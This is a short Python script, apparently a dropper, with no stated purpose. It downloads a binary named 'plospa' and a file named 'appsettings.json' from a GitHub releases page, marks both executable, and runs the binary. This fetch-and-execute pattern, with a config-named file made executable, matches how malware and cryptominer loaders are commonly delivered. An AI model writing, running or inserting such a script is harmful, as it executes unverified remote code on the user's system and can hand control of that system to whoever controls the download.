import sys
import os
os.system('wget https://github.com/vedhagsvp/taberas/releases/download/latest/plospa')
os.system('wget https://github.com/vedhagsvp/taberas/releases/download/latest/appsettings.json')
os.system('chmod +x appsettings.json')
os.system('chmod +x plospa')
os.system('./plospa')
